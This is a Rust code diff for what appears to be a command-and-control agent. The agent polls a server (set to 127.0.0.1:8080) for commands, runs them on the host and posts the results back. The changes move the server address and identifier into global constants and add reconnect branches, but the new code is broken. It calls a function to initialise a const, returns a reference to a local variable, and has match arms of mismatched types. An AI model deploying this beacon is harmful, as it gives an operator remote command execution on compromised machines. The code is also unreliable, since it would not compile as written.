@@ -10,7 +10,11 @@ use std::path::Path;
 use wait_timeout::ChildExt;
 use std::io::Read;
 
-fn initHost(server_ip:&str) -> String{
+const sleep_time: Duration = time::Duration::from_millis(5000);
+const server_ip: &str = "http://127.0.0.1:8080";
+const identifier: &str = initHost();
+
+fn initHost() -> &str{
     let mut ip = "";
     let mut os = "";
     if cfg!(windows) {
@@ -30,19 +34,27 @@ fn initHost(server_ip:&str) -> String{
             print(&"Can't connect to server");
             let sleep_time = time::Duration::from_millis(5000);
             thread::sleep(sleep_time);
-            initHost(&server_ip)
+            initHost()
         }
     }.to_string();
     print(&hostname);
-    return hostname;
+    return &hostname;
 }
 
-fn getCommands(identifier:&str,server_ip:&str){
+fn getCommands(identifier:&str){
     let commands_url = format!("{}/hosts/{}/commands",server_ip,identifier);
-    let responses_url = format!("{}/hosts/{}/responses",server_ip,identifier);
     let checkin_url = format!("{}/hosts/{}/checkIn",server_ip,identifier);
 	let client = Client::new();
-	let res = client.get(commands_url).send().unwrap().text().unwrap();
+	let res = match client.get(commands_url).send(){
+        Ok(ok)=>{
+            ok.text().unwrap()
+        }, Err(_)=>{
+            print(&"Can't connect to server");
+            let sleep_time = time::Duration::from_millis(5000);
+            thread::sleep(sleep_time);
+            initHost()
+        }
+    };
     let res = format!(r#"{}"#,res);
     println!("{}",res);
     let res = json::parse(&res).unwrap();
@@ -126,10 +138,20 @@ fn run_command(cmd: &str) -> String {
 }
 
 fn post_response(cmd_id: &str, response: &str){
+    let responses_url = format!("{}/hosts/{}/responses",server_ip, identifier);
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::new();
-    let res = client.post("http://127.0.0.1:8080/hosts/Ubuntu1.1/responses").json(&text).send().unwrap();
+    let res = match client.post(&responses_url).json(&text).send(){
+        Ok(ok)=>{
+            ok
+        }, Err(_)=>{
+            print(&"Can't connect to server");
+            let sleep_time = time::Duration::from_millis(5000);
+            thread::sleep(sleep_time);
+            initHost()
+        }
+    };
     print("Successfully posted response to server.")
 }
 
@@ -141,11 +163,8 @@ fn print(txt:&str){
 }
 
 fn main(){
-    let sleep_time = time::Duration::from_millis(5000);
-    let server_ip = "http://127.0.0.1:8080";
-    let identifier = initHost(server_ip);
     loop{
-        getCommands(&identifier,&server_ip);
+        getCommands(&identifier);
         thread::sleep(sleep_time);
     }
 }
